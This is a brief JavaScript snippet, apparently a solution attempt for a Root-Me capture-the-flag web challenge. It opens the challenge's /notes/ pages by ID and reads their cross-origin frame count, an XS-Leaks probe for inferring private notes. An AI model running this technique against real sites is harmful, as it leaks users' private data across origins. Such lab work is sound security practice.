<script
const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";

function test(i) {
    const w = window.open(TARGET + i);

    setTimeout(() => {
        let frames;

        try {
            frames = w.length;
        } catch (e) {
            frames = -1;
        }

        console.log("ID:", i, "frames:", frames);

        w.close();
    }, 1000);
}

test(1479);
test(1480);
</script>
